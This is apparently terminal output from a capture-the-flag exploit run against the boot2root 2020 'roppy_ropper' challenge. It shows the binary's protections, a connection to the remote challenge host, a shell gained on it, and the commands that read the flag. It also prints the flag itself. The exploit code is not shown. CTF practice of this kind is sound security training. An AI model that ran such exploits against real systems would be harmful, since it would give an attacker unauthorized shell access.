# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/roppy_ropper/lsass'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 35.238.225.156 on port 1004: Done
[*] Switching to interactive mode
Hey sorry that is not allowed
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$ ls -l
total 688
-r--r--r-- 1 pwnflag pwnflag     35 Dec  6 09:29 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 698068 Dec  6 09:29 lsass
$ cat flag.txt
b00t2root{R0p_cHa1nS_ar3_tH3_b3st}
